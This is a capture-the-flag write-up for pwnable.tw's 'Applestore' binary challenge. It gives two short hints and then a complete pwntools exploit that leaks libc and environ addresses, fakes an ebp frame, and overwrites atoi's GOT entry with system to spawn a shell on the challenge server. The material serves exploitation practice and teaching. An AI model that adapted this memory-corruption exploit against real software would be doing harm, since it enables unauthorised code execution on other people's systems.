# Pwnable.tw - Applestore

* Website : Pwnable.tw
* Challenge : Applestore 
* Writeup author : Redhung aka r3dhun9
>Contact :[Philip Chen (Facebook)](https://www.facebook.com/philip.chen.581)

## 0x00
1. Iphone8 is lay on the stack and it can be overwrite.
2. An useful tip: modify **ebp** to get a fake function frame.

## 0x01
Exploit:
```python
from pwn import *

#r = process(['/glibc/2.23/32/lib/ld-2.23.so','./applestore'], env={'LD_PRELOAD':'./libc_32.so.6'})
#r = process('./applestore')
r = remote('chall.pwnable.tw', 10104)
got = p32(0x804b010)
atoi_got = p32(0x804b062)

def get_iphone_8():
    for i in range(20):
        r.recvuntil('>')
        r.send('2')
        r.recvuntil('>')
        r.send('2')
    for i in range(6):
        r.recvuntil('>')
        r.send('2')
        r.recvuntil('>')
        r.send('1')

def leak_libc():
    r.recvuntil('>')
    r.send('5')
    r.recvuntil('>')
    r.send('y')
    r.recvuntil('>')
    r.send('4')
    r.recvuntil('>')
    r.send('y\x00'+got+'\x30'*4+'\x00'*4+'\x00'*4)
    r.recvuntil('27: ')
    leak_got = r.recv()[:4]
    return(int(u32(leak_got)))

def leak_env(env):
    r.send('4')
    r.recvuntil('>')
    r.send('y\x00'+env+'\x30'*4+'\x00'*4+'\x00'*4)
    r.recvuntil('27: ')
    leak = r.recv()[:4]
    return(int(u32(leak)))

def got_hijacking(ebp, system, bin_sh):
    r.send('3')
    r.recvuntil('>')
    r.send('27'+'\x00'*8+ebp+atoi_got)
    r.recvuntil('>')
    r.send(system+';sh\x00')

def main():
    get_iphone_8()
    libc = leak_libc()
    libc_base_offset = 0x49020
    libc_base = libc - libc_base_offset
    system_offset = 0x3a940
    env_offset = 0x1b1dbc
    libc_system = libc_base + system_offset
    libc_env = libc_base + env_offset
    env_leak = leak_env(p32(libc_env))
    print('libc_base: '+hex(libc_base))
    print('libc_system: '+hex(libc_system))
    print('libc_env: '+hex(libc_env))
    print('env_leak: '+hex(env_leak))
    ebp_offset = 0x104
    ebp = env_leak - ebp_offset
    print('ebp: '+hex(ebp))
    bin_sh = p32(0x69622f3b) + p32(0x68732f6e) + '\x00'
    got_hijacking(p32(ebp-12), p32(libc_system), bin_sh)
    r.interactive()

if __name__ == '__main__':
    main()

```
